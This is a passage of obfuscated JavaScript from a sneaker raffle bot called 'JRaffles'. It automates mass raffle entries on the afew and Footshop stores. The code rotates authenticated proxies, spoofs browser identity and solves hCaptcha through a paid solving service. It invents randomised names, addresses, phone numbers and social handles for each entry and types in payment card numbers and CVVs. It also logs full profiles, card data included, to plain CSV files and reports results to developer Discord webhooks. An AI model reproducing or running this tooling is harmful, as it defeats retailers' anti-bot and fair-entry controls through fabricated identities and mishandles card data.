                                })['setThumbnail'](_0x2a3314['logo'])['addFields']({
                                    'name': 'User',
                                    'value': '' + _0x3566aa,
                                    'inline': !![]
                                }, {
                                    'name': 'Store',
                                    'value': '' + _0x2a3314['store'],
                                    'inline': !![]
                                }, {
                                    'name': 'Delay',
                                    'value': '' + _0x1ca3b9['delay'],
                                    'inline': !![]
                                })['setTimestamp']()['setFooter']({
                                    'text': 'JRaffles\x20v' + _0x531a7c,
                                    'iconURL': 'https://pbs.twimg.com/profile_images/1592888006293192704/--rXvwpf_400x400.jpg'
                                });
                                return _0x59aa4a['data'];
                            } else {
                                if (_0x528521 && _0x287af7 == 'ver') {
                                    var _0x59aa4a = new _0x5d57ee()['setColor'](0xc0d6d6)['setTitle']('Verification\x20Failed')['setAuthor']({
                                        'name': 'JRaffles',
                                        'iconURL': 'https://pbs.twimg.com/profile_images/1592888006293192704/--rXvwpf_400x400.jpg',
                                        'url': 'https://twitter.com/JRaffles_'
                                    })['setThumbnail'](_0x2a3314['logo'])['addFields']({
                                        'name': 'User',
                                        'value': '' + _0x3566aa,
                                        'inline': !![]
                                    }, {
                                        'name': 'Error',
                                        'value': '' + _0x307bad,
                                        'inline': !![]
                                    }, {
                                        'name': 'Store',
                                        'value': '' + _0x2a3314['store'],
                                        'inline': !![]
                                    }, {
                                        'name': 'Delay',
                                        'value': '' + _0x1ca3b9['delay'],
                                        'inline': !![]
                                    })['setTimestamp']()['setFooter']({
                                        'text': 'JRaffles\x20v' + _0x531a7c,
                                        'iconURL': 'https://pbs.twimg.com/profile_images/1592888006293192704/--rXvwpf_400x400.jpg'
                                    });
                                    return _0x59aa4a['data'];
                                }
                            }
                        }
                    }
                }
            }
        }
    }
}
async function _0x44956d(_0x585fb9, _0x8c34be) {
    var _0x1fc313 = _0x585fb9[_0x8c34be]['Address1']['split'](''), _0x3c6149 = _0x585fb9[_0x8c34be]['Address2']['split'](''), _0x468d2b = _0x585fb9[_0x8c34be]['Email']['split']('@');
    for (var _0x260e2e = 0x0; _0x260e2e < _0x1fc313['length']; _0x260e2e++) {
        if (_0x1fc313[_0x260e2e] == 'X') {
            var _0x1f524e = Math['round'](Math['random']() * (_0x56dec2['length'] - 0x1));
            _0x1fc313[_0x260e2e] = _0x2fffc8[_0x1f524e];
        }
    }
    ;
    for (var _0x260e2e = 0x0; _0x260e2e < _0x3c6149['length']; _0x260e2e++) {
        if (_0x3c6149[_0x260e2e] == 'X') {
            var _0x1f524e = Math['round'](Math['random']() * (_0x56dec2['length'] - 0x1));
            _0x3c6149[_0x260e2e] = _0x2fffc8[_0x1f524e];
        }
    }
    ;
    _0x585fb9[_0x8c34be]['FirstName'] == 'RANDOM' && (_0x585fb9[_0x8c34be]['FirstName'] = _0x39e6ac['first']());
    _0x585fb9[_0x8c34be]['LastName'] == 'RANDOM' && (_0x585fb9[_0x8c34be]['LastName'] = _0x39e6ac['last']());
    _0x468d2b[0x0] == 'RANDOM' ? _0x468d2b[0x0] = '' + _0x39e6ac['first']() + _0x39e6ac['last']() + '@' : _0x468d2b[0x0] = _0x468d2b[0x0] + '@';
    _0x585fb9[_0x8c34be]['Email'] = _0x468d2b['join'](''), _0x585fb9[_0x8c34be]['Address1'] = _0x1fc313['join'](''), _0x585fb9[_0x8c34be]['Address2'] = _0x3c6149['join']('');
    _0x585fb9[_0x8c34be]['Phone'] == 'RANDOM' && (_0x585fb9[_0x8c34be]['Phone'] = '0' + _0x4c130e(0x5f5e100, 0x3b9ac9ff));
    if (_0x585fb9[_0x8c34be]['Follower'] == 'RANDOM') {
        var _0x499c4f = _0x4c130e(0x1, 0x270f);
        _0x585fb9[_0x8c34be]['Follower'] = '' + _0x39e6ac['first']() + _0x39e6ac['last']() + _0x499c4f + '\x20';
    }
    _0x585fb9[_0x8c34be]['HouseNumber'] == 'RANDOM' && (_0x585fb9[_0x8c34be]['HouseNumber'] = _0x4c130e(0x1, 0xc8));
    if (_0x585fb9[_0x8c34be]['Address1'] == 'RANDOM') {
        var _0x3f8117 = Math['round'](Math['random']() * (_0x56dec2['length'] - 0x1)), _0x1540e4 = _0x2fffc8[_0x3f8117];
        _0x585fb9[_0x8c34be]['Address1'] = _0x39e6ac['last']() + 'straat', _0x585fb9[_0x8c34be]['Zip'] == '' && (_0x585fb9[_0x8c34be]['Postcode'] = _0x4c130e(0x3e8, 0x270f) + '\x20' + _0x1540e4 + _0x1540e4, _0x585fb9[_0x8c34be]['Zip'] = _0x585fb9[_0x8c34be]['Postcode']), _0x585fb9[_0x8c34be]['HouseNumber'] = '' + _0x4c130e(0x1, 0xc8);
    }
    return;
}
;
async function _0x3c82b6(_0x4fff95, _0x3028ab) {
    _0x1c44db['appendFileSync']('../failed-tasks.csv', _0x10b828() + ',' + _0x3028ab['store'] + ',' + _0x3028ab['name'] + ',' + _0x4fff95['Url'] + ',' + _0x4fff95['Size'] + ',' + _0x4fff95['Follower'] + ',' + _0x4fff95['FirstName'] + ',' + _0x4fff95['LastName'] + ',' + _0x4fff95['Address1'] + ',' + _0x4fff95['Address2'] + ',' + _0x4fff95['HouseNumber'] + ',' + _0x4fff95['Zip'] + ',' + _0x4fff95['City'] + ',' + _0x4fff95['State'] + ',' + _0x4fff95['Country'] + ',' + _0x4fff95['Phone'] + ',' + _0x4fff95['Email'] + ',' + _0x4fff95['Password'] + ',' + _0x4fff95['PaymentMethod'] + ',' + _0x4fff95['CardType'] + ',' + _0x4fff95['NameOnCard'] + ',' + _0x4fff95['CardNumber'] + ',' + _0x4fff95['ExpiryDate'] + ',' + _0x4fff95['CVV'] + ',' + _0x4fff95['IsBillingSame'] + ',,,,,,,,,,\x0a');
}
async function _0x2989d8(_0x161c32, _0xd39301) {
    _0x1c44db['appendFileSync']('../successful-tasks.csv', _0x10b828() + ',' + _0xd39301['store'] + ',' + _0xd39301['name'] + ',' + _0x161c32['Url'] + ',' + _0x161c32['Size'] + ',' + _0x161c32['Follower'] + ',' + _0x161c32['FirstName'] + ',' + _0x161c32['LastName'] + ',' + _0x161c32['Address1'] + ',' + _0x161c32['Address2'] + ',' + _0x161c32['HouseNumber'] + ',' + _0x161c32['Zip'] + ',' + _0x161c32['City'] + ',' + _0x161c32['State'] + ',' + _0x161c32['Country'] + ',' + _0x161c32['Phone'] + ',' + _0x161c32['Email'] + ',' + _0x161c32['Password'] + ',' + _0x161c32['PaymentMethod'] + ',' + _0x161c32['CardType'] + ',' + _0x161c32['NameOnCard'] + ',' + _0x161c32['CardNumber'] + ',' + _0x161c32['ExpiryDate'] + ',' + _0x161c32['CVV'] + ',' + _0x161c32['IsBillingSame'] + ',,,,,,,,,,\x0a');
}
function _0x5ce3d6() {
    let _0x4c79d5 = proxyFile['split']('\x0a'), _0x2c3490 = _0x4c79d5['map']((_0x368cce, _0x3b831c) => {
        sanatizeProxy = _0x368cce['replace']('\x0d', '');
        if (_0x4c79d5[_0x3b831c + 0x1] != undefined)
            return '' + sanatizeProxy;
        return '' + sanatizeProxy;
    });
    return _0x2c3490;
}
;
async function _0x289e17(_0x18ab65) {
    var _0x4b4f04 = _0x18ab65[0x1]['split'](':');
    const _0x5e65e4 = await _0x53a2e2['launch']({
        'headless': !![],
        'args': ['--proxy-server=' + _0x4b4f04[0x0] + ':' + _0x4b4f04[0x1] + ',--no-sandbox\x27,\x0a\x20\x20\x20\x20\x20\x20\x27--disable-setuid-sandbox,--force-device-scale-factor=0.3']
    });
    try {
        const _0x2ea360 = await _0x5e65e4['newPage']();
        await _0x2ea360['authenticate']({
            'username': '' + _0x4b4f04[0x2],
            'password': '' + _0x4b4f04[0x3]
        }), console['log'](_0x31f3f5() + '\x20[' + _0x1299c5[taskModule]['name'] + ']\x20Afew\x20Scraper\x20started'), await _0x2ea360['setUserAgent']('Mozilla/5.0\x20(Windows\x20NT\x2010.0;\x20Win64;\x20x64)\x20AppleWebKit/537.36\x20(KHTML,\x20like\x20Gecko)\x20Chrome/106.0.0.0\x20Safari/537.36'), await _0x2ea360['setRequestInterception'](!![]), _0x2ea360['on']('request', _0x45da45 => {
            _0x45da45['resourceType']() === 'image' || _0x45da45['resourceType']() === 'font' || _0x45da45['resourceType']() === 'media' ? _0x45da45['abort']() : _0x45da45['continue']();
        }), await _0x2ea360['goto']('https://en.afew-store.com/collections/sneaker-raffles'), console['log'](_0x31f3f5() + '\x20[' + _0x1299c5[taskModule]['name'] + ']\x20Looking\x20for\x20Raffles'), await _0x2ea360['waitForTimeout'](0xbb8), await _0x2ea360['waitForSelector']('.product-card');
        const _0x205803 = await _0x2ea360['$$eval']('a.product-card', _0x5addda => {
            return _0x5addda['map'](_0x4aed84 => _0x4aed84['href']);
        });
        return _0x31c585 = _0x205803;
    } catch (_0x57eceb) {
        console['log']('\x20' + _0x57eceb);
    } finally {
        _0x5e65e4['close'](), console['clear']();
    }
}
;
async function _0x958417(_0x409310, _0x568db6, _0x3b1a80, _0x4b6fad, _0x101a8b) {
    _0x568db6 != 'ver' && await _0x44956d(_0x4b6fad, _0x409310);
    if (_0x1ca3b9['useRandomProxy'] = ![])
        var _0x15ae57 = _0x101a8b[_0x409310]['split'](':');
    else
        var _0x1699ef = Math['round'](Math['random']() * (_0x101a8b['length'] - 0x1)), _0x15ae57 = _0x101a8b[_0x1699ef]['split'](':');
    var _0x5602c1 = _0x3b1a80['data'];
    _0x568db6 != 'ver' && (_0x5602c1['data']['attributes']['properties']['$first_name'] = '' + _0x4b6fad[_0x409310]['FirstName'], _0x5602c1['data']['attributes']['properties']['$last_name'] = '' + _0x4b6fad[_0x409310]['LastName'], _0x5602c1['data']['attributes']['properties']['$address1'] = _0x4b6fad[_0x409310]['Address1'] + '\x20' + _0x4b6fad[_0x409310]['HouseNumber'] + '\x20' + _0x4b6fad[_0x409310]['Address2'], _0x5602c1['data']['attributes']['properties']['$zip'] = '' + _0x4b6fad[_0x409310]['Zip'], _0x5602c1['data']['attributes']['properties']['$city'] = '' + _0x4b6fad[_0x409310]['City'], _0x5602c1['data']['attributes']['properties']['$country'] = '' + _0x4b6fad[_0x409310]['Country'], _0x5602c1['data']['attributes']['properties']['Size'] = '' + _0x4b6fad[_0x409310]['Size'], _0x5602c1['data']['attributes']['properties']['Instagram\x20Handle'] = '' + _0x4b6fad[_0x409310]['Follower'], _0x568db6 == 'exp' ? _0x5602c1['data']['attributes']['email'] = '' + _0x4b6fad[_0x409310]['FirstName'] + _0x4b6fad[_0x409310]['LastName'] + _0x1ca3b9['catchall'] : _0x5602c1['data']['attributes']['email'] = '' + _0x4b6fad[_0x409310]['Email']);
    var _0x558c9e = {
        'jar': _0x2ae84b,
        'followAllRedirects': !![],
        'method': 'POST',
        'url': _0x3b1a80['url'],
        'headers': _0x3b1a80['headers'],
        'body': JSON['stringify'](_0x5602c1),
        'proxy': 'http://' + _0x15ae57[0x2] + ':' + _0x15ae57[0x3] + '@' + _0x15ae57[0x0] + ':' + _0x15ae57[0x1]
    };
    return _0x568db6 === 'ver' && (_0x558c9e['method'] = 'GET'), new Promise(function (_0x1673a4, _0x58f575) {
        callback = async (_0x502774, _0x332978, _0x374d9a) => {
            if (!_0x502774 && _0x332978['statusCode'] == 0xca || !_0x502774 && _0x332978['statusCode'] == 0xc8) {
                _0x1673a4(console['log'](_0x471d3f['green'](_0x31f3f5() + '\x20[' + _0x3b1a80['name'] + ']\x20Task\x20' + (_0x409310 + 0x1) + ':\x20Raffle\x20Entered!')));
                if (_0x568db6 != 'ver') {
                    _0x2989d8(_0x4b6fad[_0x409310], _0x3b1a80);
                    var _0xbd71db = await _0x51c110(_0x4b6fad[_0x409310], _0x3b1a80, 'dev', ![]), _0x225eb7 = await _0x51c110(_0x4b6fad[_0x409310], _0x3b1a80, 'pub', ![]);
                    const _0x5f4ee5 = {
                        'succesDEVMSG': { 'embeds': [_0xbd71db] },
                        'succesPUBMSG': { 'embeds': [_0x225eb7] }
                    };
                    if (_0x1ca3b9['webhook'] != undefined && _0x1ca3b9['webhook'] != '')
                        try {
                            await _0x5778ae(_0x1ca3b9['webhook'], _0x5f4ee5['succesDEVMSG']);
                        } catch {
                        }
                    await _0x30926a(0xc8), await _0x5778ae(_0x580ee6, _0x5f4ee5['succesDEVMSG']), await _0x30926a(0xc8);
                    try {
                        await _0x5778ae(_0xb27635, _0x5f4ee5['succesPUBMSG']);
                    } catch {
                    }
                } else {
                    if (_0x568db6 == 'ver') {
                        var _0xbd71db = await _0x51c110(null, _0x3b1a80, 'ver', ![]);
                        const _0x5b44c8 = {
                            'succesDEVMSG': { 'embeds': [_0xbd71db] },
                            'succesPUBMSG': { 'embeds': [_0x225eb7] }
                        };
                        await _0x5778ae(_0x2b3e0d, _0x5b44c8['succesDEVMSG']);
                    }
                }
            } else {
                if (_0x568db6 != 'ver') {
                    var _0x7303c9 = '' + _0x502774, _0x287b4d = await _0x51c110(_0x4b6fad[_0x409310], _0x3b1a80, 'dev', !![], _0x7303c9), _0x3ebdfb = {};
                    _0x3ebdfb['errorDEV'] = { 'embeds': [_0x287b4d] }, _0x3c82b6(_0x4b6fad[_0x409310], _0x3b1a80), _0x1ca3b9['webhook'] != undefined && _0x1ca3b9['webhook'] != '' && await _0x5778ae(_0x1ca3b9['webhook'], _0x3ebdfb['errorDEV']), await _0x5778ae(_0xc30fae, _0x3ebdfb['errorDEV']);
                }
                _0x58f575(console['log'](_0x31f3f5() + '\x20[' + _0x3b1a80['name'] + ']\x20Task\x20' + (_0x409310 + 0x1) + ':\x20' + _0x502774));
            }
        };
        try {
            _0x568db6 === 'ver' ? console['log'](_0x31f3f5() + '\x20[' + _0x3b1a80['name'] + ']\x20Task\x20' + (_0x409310 + 0x1) + ':\x20Verifying.') : console['log'](_0x31f3f5() + '\x20[' + _0x3b1a80['name'] + ']\x20Task\x20' + (_0x409310 + 0x1) + ':\x20Sending\x20Entry\x20for\x20' + _0x5602c1['data']['attributes']['email']), _0x30593c(_0x558c9e, callback);
        } catch (_0x2b5528) {
            console['log'](_0x31f3f5() + '\x20Task\x20' + (_0x409310 + 0x1) + ':\x20' + _0x2b5528);
        }
    });
}
;
async function _0x9f0708(_0x40b349, _0x165882, _0x1be8a7) {
    _0x53a2e2['use'](_0x572d68()), _0x53a2e2['use'](_0x38f41a({
        'provider': {
            'id': '2captcha',
            'token': '' + _0x1ca3b9['captchaKey']
        },
        'visualFeedback': !![]
    }));
    for (var _0xc4b6a1 = 0x0; _0xc4b6a1 < _0x40b349['length']; _0xc4b6a1++) {
        var _0x662265;
        if (_0x5225b2 != 'yes')
            var _0x5225b2 = '', _0x178f44 = 0x0;
        var _0x3d8399 = [{
            'type': 'rich',
            'title': 'Succesful\x20Footshop\x20entry',
            'description': '',
            'color': 0xc0d6d6,
            'fields': [
                {
                    'name': 'User',
                    'value': '' + _0x3566aa
                },
                {
                    'name': 'Product',
                    'value': '' + _0x40b349[_0xc4b6a1]['Url']
                },
                {
                    'name': 'Size',
                    'value': '' + _0x40b349[_0xc4b6a1]['Size']
                },
                {
                    'name': 'Delay',
                    'value': '' + _0x1ca3b9['footshopDelay']
                },
                {
                    'name': 'Version',
                    'value': '' + _0x531a7c
                }
            ]
        }], _0xad719 = await _0x51c110(_0x40b349[_0xc4b6a1], _0x1be8a7, 'dev', ![]), _0x31e9e5 = await _0x51c110(_0x40b349[_0xc4b6a1], _0x1be8a7, 'pub', ![]);
        const _0x4bbabe = {
            'succesDEVMSG': { 'embeds': [_0xad719] },
            'succesPUBMSG': { 'embeds': [_0x31e9e5] }
        }, _0x11f920 = { 'embeds': _0x3d8399 };
        await _0x44956d(_0x40b349, _0xc4b6a1);
        if (_0x40b349[_0xc4b6a1]['Email'] == '' || _0x40b349[_0xc4b6a1]['FirstName'] == '' || _0x40b349[_0xc4b6a1]['LastName'] == '' || _0x40b349[_0xc4b6a1]['Country'] == '' || _0x40b349[_0xc4b6a1]['Size'] == '' || _0x40b349[_0xc4b6a1]['Address1'] == '' || _0x40b349[_0xc4b6a1]['Zip'] == '') {
            console['log'](_0x31f3f5() + '\x20[' + _0x1be8a7['name'] + ']\x20Task\x20' + (_0xc4b6a1 + 0x1) + '\x20:\x20Invalid\x20CSV');
            continue;
        }
        if (_0x40b349[_0xc4b6a1]['Email'] == '' || _0x40b349[_0xc4b6a1]['FirstName'] == '' || _0x40b349[_0xc4b6a1]['LastName'] == '' || _0x40b349[_0xc4b6a1]['Country'] == '' || _0x40b349[_0xc4b6a1]['Size'] == '' || _0x40b349[_0xc4b6a1]['Address1'] == '' || _0x40b349[_0xc4b6a1]['Zip'] == '' || _0x40b349[_0xc4b6a1]['Phone'] == '') {
            console['log'](_0x31f3f5() + '\x20[' + _0x1be8a7['name'] + ']\x20Task\x20' + (_0xc4b6a1 + 0x1) + '\x20:\x20Invalid\x20CSV');
            continue;
        }
        const _0x2e0f01 = '' + _0x40b349[_0xc4b6a1]['Url'];
        if (_0x1ca3b9['useRandomProxy'] = ![])
            var _0xa8ede8 = _0x165882[_0xc4b6a1]['split'](':');
        else
            var _0x57c3d6 = Math['round'](Math['random']() * (_0x165882['length'] - 0x1)), _0xa8ede8 = _0x165882[_0x57c3d6]['split'](':');
        const _0x208f0e = await _0x53a2e2['launch']({
            'headless': !![],
            'args': ['--proxy-server=' + _0xa8ede8[0x0] + ':' + _0xa8ede8[0x1]]
        });
        try {
            const _0x3922dd = await _0x208f0e['newPage']();
            await _0x3922dd['authenticate']({
                'username': '' + _0xa8ede8[0x2],
                'password': '' + _0xa8ede8[0x3]
            }), console['log'](_0x31f3f5() + '\x20[' + _0x1be8a7['name'] + ']\x20Task\x20' + (_0xc4b6a1 + 0x1) + '\x20:\x20Getting\x20Session'), await _0x3922dd['setUserAgent']('Mozilla/5.0\x20(Windows\x20NT\x2010.0;\x20Win64;\x20x64)\x20AppleWebKit/537.36\x20(KHTML,\x20like\x20Gecko)\x20Chrome/106.0.0.0\x20Safari/537.36'), await _0x3922dd['setRequestInterception'](!![]), _0x3922dd['on']('request', _0x5616a7 => {
                _0x5616a7['resourceType']() === 'image' || _0x5616a7['resourceType']() === 'font' || _0x5616a7['resourceType']() === 'media' ? _0x5616a7['abort']() : _0x5616a7['continue']();
            }), await _0x3922dd['goto'](_0x2e0f01), await _0x30926a(0xbb8), await _0x3922dd['waitForSelector']('.control__JhutY'), await _0x3922dd['click']('.control__JhutY'), await _0x30926a(0x1f4);
            if (_0x40b349[_0xc4b6a1]['Size'] != 'RANDOM')
                try {
                    const _0x3b0fb9 = await _0x3922dd['$x']('//div[contains(text(),\x20\x27' + _0x40b349[_0xc4b6a1]['Size'] + '\x27)]');
                    await _0x3b0fb9[0x0]['click']();
                } catch {
                    console['log'](_0x471d3f['red'](_0x31f3f5() + '\x20[' + _0x1be8a7['name'] + ']\x20Task\x20' + (_0xc4b6a1 + 0x1) + '\x20:\x20Size\x20Not\x20Found'));
                    continue;
                }
            else {
                const _0x13e771 = await _0x3922dd['$$']('.options__3UQpT\x20>\x20div.row');
                var _0x449035 = Math['round'](Math['random']() * (_0x13e771['length'] - 0x1));
                await _0x13e771[_0x449035]['click']();
            }
            await _0x30926a(0x4b0);
            const _0x5d9219 = await _0x3922dd['$x']('//span[contains(text(),\x20\x27Enter\x20raffle\x20now\x27)]');
            await _0x5d9219[0x0]['click'](), await _0x3922dd['waitForSelector']('input[name=\x22email\x22]'), console['log'](_0x31f3f5() + '\x20[' + _0x1be8a7['name'] + ']\x20Task\x20' + (_0xc4b6a1 + 0x1) + '\x20:\x20Filling\x20Entry\x20Credentials'), await _0x3922dd['type']('input[name=\x22email\x22]', '' + _0x40b349[_0xc4b6a1]['Email']), await _0x30926a(0x640), await _0x3922dd['type']('input[name=\x22phone\x22]', '' + _0x40b349[_0xc4b6a1]['Phone']), await _0x30926a(0x4b0), await _0x3922dd['click']('button.btn.continue-button__1RtsS'), await _0x30926a(0x4b0);
            try {
                await _0x3922dd['type']('input[name=\x22firstName\x22]', '' + _0x40b349[_0xc4b6a1]['FirstName']), await _0x30926a(0x258);
            } catch {
                const _0xfbe39d = await _0x3922dd['$$eval']('.invalid-feedback\x20>\x20div', _0x952723 => {
                    return _0x952723['map'](_0x3e3027 => _0x3e3027['innerText']);
                });
                console['log'](_0x471d3f['red'](_0x31f3f5() + '\x20[' + _0x1be8a7['name'] + ']\x20Task\x20' + (_0xc4b6a1 + 0x1) + '\x20:\x20' + _0xfbe39d));
                continue;
            }
            await _0x3922dd['type']('input[name=\x22lastName\x22]', '' + _0x40b349[_0xc4b6a1]['LastName']), await _0x30926a(0xc8), await _0x3922dd['type']('input[name=\x22instagramUsername\x22]', '' + _0x40b349[_0xc4b6a1]['Follower']), await _0x30926a(0x4b0), await _0x3922dd['click']('button.btn.continue-button__1RtsS'), await _0x30926a(0x3e8), console['log'](_0x31f3f5() + '\x20[' + _0x1be8a7['name'] + ']\x20Task\x20' + (_0xc4b6a1 + 0x1) + '\x20:\x20Filling\x20Shipping'), await _0x3922dd['select']('select[name=\x22country\x22]', '' + _0x40b349[_0xc4b6a1]['Country']), await _0x30926a(0x2bc), await _0x3922dd['type']('input[name=\x22streetName\x22]', '' + _0x40b349[_0xc4b6a1]['Address1']), await _0x30926a(0x258), await _0x3922dd['type']('input[name=\x22houseNumber\x22]', _0x40b349[_0xc4b6a1]['HouseNumber'] + '\x20' + _0x40b349[_0xc4b6a1]['Address2']), await _0x30926a(0xc8), await _0x3922dd['type']('input[name=\x22postalCode\x22]', '' + _0x40b349[_0xc4b6a1]['Zip']), await _0x30926a(0x1f4), await _0x3922dd['type']('input[name=\x22city\x22]', '' + _0x40b349[_0xc4b6a1]['City']), await _0x30926a(0x4b0), await _0x3922dd['click']('input[name=\x22consent::privacy-policy-101\x22]'), await _0x30926a(0x4b0), await _0x3922dd['click']('button.btn.continue-button__1RtsS'), await _0x30926a(0x4b0), console['log'](_0x31f3f5() + '\x20[' + _0x1be8a7['name'] + ']\x20Task\x20' + (_0xc4b6a1 + 0x1) + '\x20:\x20Solving\x20hCaptcha'), await _0x3922dd['solveRecaptchas'](), console['log'](_0x31f3f5() + '\x20[' + _0x1be8a7['name'] + ']\x20Task\x20' + (_0xc4b6a1 + 0x1) + '\x20:\x20hCaptcha\x20solved'), await _0x30926a(0xbb8), await _0x3922dd['click']('button.btn.continue-button__1RtsS'), await _0x30926a(0x1388), console['log'](_0x31f3f5() + '\x20[' + _0x1be8a7['name'] + ']\x20Task\x20' + (_0xc4b6a1 + 0x1) + '\x20:\x20Solving\x20Adyen'), await _0x3922dd['waitForSelector']('span[data-cse=\x22encryptedCardNumber\x22]'), await _0x3922dd['click']('span[data-cse=\x22encryptedCardNumber\x22]'), await _0x30926a(0x4b0), await _0x3922dd['type']('span[data-cse=\x22encryptedCardNumber\x22]', '' + _0x40b349[_0xc4b6a1]['CardNumber']), await _0x30926a(0x320), await _0x3922dd['click']('span[data-cse=\x22encryptedExpiryDate\x22]'), await _0x3922dd['type']('span[data-cse=\x22encryptedExpiryDate\x22]', '' + _0x40b349[_0xc4b6a1]['ExpiryDate']), await _0x30926a(0x4b0), await _0x3922dd['click']('span[data-cse=\x22encryptedSecurityCode\x22]'), await _0x3922dd['type']('span[data-cse=\x22encryptedSecurityCode\x22]', '' + _0x40b349[_0xc4b6a1]['CVV']), await _0x30926a(0x226), await _0x3922dd['type']('input[name=\x22holderName\x22]', '' + _0x40b349[_0xc4b6a1]['NameOnCard']), await _0x30926a(0x226), await _0x3922dd['click']('button.adyen-checkout__button'), console['log'](_0x31f3f5() + '\x20[' + _0x1be8a7['name'] + ']\x20Task\x20' + (_0xc4b6a1 + 0x1) + '\x20:\x20Awaiting\x203DS');
            try {
                await _0x3922dd['waitForSelector']('.thank-you__1AwOo', { 'timeout': 0x493e0 }), await _0x30926a(0xbb8);
            } catch (_0x1060bf) {
                console['log'](_0x471d3f['red'](_0x31f3f5() + '\x20[' + _0x1be8a7['name'] + ']\x20Task\x20' + (_0xc4b6a1 + 0x1) + '\x20:\x203DS\x20Failed')), _0x662265 = '3DS\x20Error\x20' + _0x1060bf;
                var _0x7b567d = await _0x51c110(_0x40b349[_0xc4b6a1], _0x1be8a7, 'dev', !![], _0x662265);
                _0x4bbabe['errorDEV'] = { 'embeds': [_0x7b567d] };
                _0x1ca3b9['webhook'] != undefined && _0x1ca3b9['webhook'] != '' && await _0x5778ae(_0x1ca3b9['webhook'], _0x4bbabe['errorDEV']);
                await _0x5778ae(_0xc30fae, _0x4bbabe['errorDEV']);
                continue;
            }
            _0x2989d8(_0x40b349[_0xc4b6a1], _0x1be8a7), console['log'](_0x471d3f['green'](_0x31f3f5() + '\x20[' + _0x1be8a7['name'] + ']\x20Task\x20' + (_0xc4b6a1 + 0x1) + '\x20:\x20Raffle\x20Entered!'));
            if (_0x1ca3b9['webhook'] != undefined && _0x1ca3b9['webhook'] != '')
                try {
                    await _0x5778ae(_0x1ca3b9['webhook'], _0x4bbabe['succesDEVMSG']);
                } catch {
                }
            await _0x30926a(0xc8), await _0x5778ae(_0x580ee6, _0x4bbabe['succesDEVMSG']), await _0x30926a(0xc8);
            try {
                await _0x5778ae(_0xb27635, _0x4bbabe['succesPUBMSG']);
            } catch {
            }
        } catch (_0x462dd3) {
            console['log'](_0x31f3f5() + '\x20[' + _0x1be8a7['name'] + ']\x20Task\x20' + (_0xc4b6a1 + 0x1) + '\x20:\x20' + _0x462dd3), _0x662265 = '' + _0x462dd3;
            var _0x7b567d = await _0x51c110(_0x40b349[_0xc4b6a1], _0x1be8a7, 'dev', !![], _0x662265);
            _0x4bbabe['errorDEV'] = { 'embeds': [_0x7b567d] }, _0x1ca3b9['webhook'] != undefined && _0x1ca3b9['webhook'] != '' && await _0x5778ae(_0x1ca3b9['webhook'], _0x4bbabe['errorDEV']), await _0x5778ae(_0xc30fae, _0x4bbabe['errorDEV']), _0x5225b2 = 'yes';
        } finally {
            _0x208f0e['close']();
            if (_0x5225b2 == 'yes' && _0x178f44 != 0x5) {
                console['log'](_0x471d3f['red'](_0x31f3f5() + '\x20[' + _0x1be8a7['name'] + ']\x20Task\x20' + (_0xc4b6a1 + 0x1) + '\x20:\x20Retrying')), _0xc4b6a1 = _0xc4b6a1 - 0x1, _0x178f44 = _0x178f44 + 0x1;
                continue;
            }
            console['log']('Waiting\x20for\x20' + _0x1ca3b9['footshopDelay'] + '\x20ms'), await _0x30926a(_0x1ca3b9['footshopDelay']);
        }
    }
}
afewFunction = async (_0x2a12f6, _0x3c2425, _0x2418d7, _0x31ac67, _0x36d174) => {
    for (var _0xbedb7e = 0x0; _0xbedb7e < _0x31ac67['length']; _0xbedb7e++) {
        _0x1ca3b9['AfewDelay'] = _0x1ca3b9['delay'];
        var _0x61488e;
        if (_0x469ee8 != 'yes')
            var _0x469ee8 = '', _0x3b2db9 = 0x0;
        _0x31ac67[_0xbedb7e]['Url'] = _0x2a12f6, _0x359416(_0x2418d7['name'] + '\x20Task\x20' + (_0xbedb7e + 0x1) + '\x20/\x20' + _0x31ac67['length'] + '\x20||\x20File:\x20' + _0x25c22b + '\x20Proxies:\x20' + _0x2e4847), await _0x44956d(_0x31ac67, _0xbedb7e);
        var _0x300b29 = await _0x51c110(_0x31ac67[_0xbedb7e], _0x2418d7, 'dev', ![]), _0x22f5aa = await _0x51c110(_0x31ac67[_0xbedb7e], _0x2418d7, 'pub', ![]);
        const _0x95da97 = {
            'succesDEVMSG': { 'embeds': [_0x300b29] },
            'succesPUBMSG': { 'embeds': [_0x22f5aa] }
        };
        if (_0x31ac67[_0xbedb7e]['Email'] == '' || _0x31ac67[_0xbedb7e]['FirstName'] == '' || _0x31ac67[_0xbedb7e]['LastName'] == '' || _0x31ac67[_0xbedb7e]['Country'] == '' || _0x31ac67[_0xbedb7e]['Size'] == '' || _0x31ac67[_0xbedb7e]['Address1'] == '' || _0x31ac67[_0xbedb7e]['Zip'] == '') {
            console['log'](_0x31f3f5() + '\x20[' + _0x2418d7['name'] + ']\x20Task\x20' + (_0xbedb7e + 0x1) + '\x20:\x20Invalid\x20CSV');
            continue;
        }
        if (_0x1ca3b9['useRandomProxy'] = ![])
            var _0x277679 = _0x36d174[_0xbedb7e]['split'](':');
        else
            var _0xc247a8 = Math['round'](Math['random']() * (_0x36d174['length'] - 0x1)), _0x277679 = _0x36d174[_0xc247a8]['split'](':');
        const _0x21fb1b = await _0x53a2e2['launch']({
            'headless': !![],
            'args': [
                '--proxy-server=' + _0x277679[0x0] + ':' + _0x277679[0x1],
                '--no-sandbox',
                '--disable-setuid-sandbox'
            ]
        });
        try {
            const _0x358c5e = await _0x21fb1b['newPage']();
            await _0x358c5e['setDefaultNavigationTimeout'](0x1d4c0), await _0x358c5e['authenticate']({
                'username': '' + _0x277679[0x2],
                'password': '' + _0x277679[0x3]
            }), console['log'](_0x31f3f5() + '\x20[' + _0x2418d7['name'] + ']\x20Task\x20' + (_0xbedb7e + 0x1) + '\x20:\x20Getting\x20Session'), await _0x358c5e['setUserAgent']('Mozilla/5.0\x20(Windows\x20NT\x2010.0;\x20Win64;\x20x64)\x20AppleWebKit/537.36\x20(KHTML,\x20like\x20Gecko)\x20Chrome/106.0.0.0\x20Safari/537.36'), await _0x358c5e['setRequestInterception'](!![]), _0x358c5e['on']('request', _0x5ee9e1 => {
                _0x5ee9e1['resourceType']() === 'image' || _0x5ee9e1['resourceType']() === 'font' || _0x5ee9e1['resourceType']() === 'media' ? _0x5ee9e1['abort']() : _0x5ee9e1['continue']();
